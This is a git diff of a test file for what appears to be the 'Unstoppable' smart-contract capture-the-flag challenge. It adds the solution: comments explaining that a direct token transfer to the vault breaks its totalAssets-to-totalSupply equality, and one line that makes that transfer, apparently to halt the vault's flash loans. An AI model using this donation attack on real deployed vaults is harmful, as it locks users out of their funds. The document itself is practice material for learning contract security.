@@ -44,7 +44,11 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** CODE YOUR SOLUTION HERE 
+         * destroy the equivalence between totalAsset and totalSupply 
+         * unlike deposit, transfer() doesn't update the totalSupply 
+         * despite receiving assets */
+        await token.connect(player).transfer(vault.address, ethers.utils.parseEther("1"));
     });
 
     after(async function () {
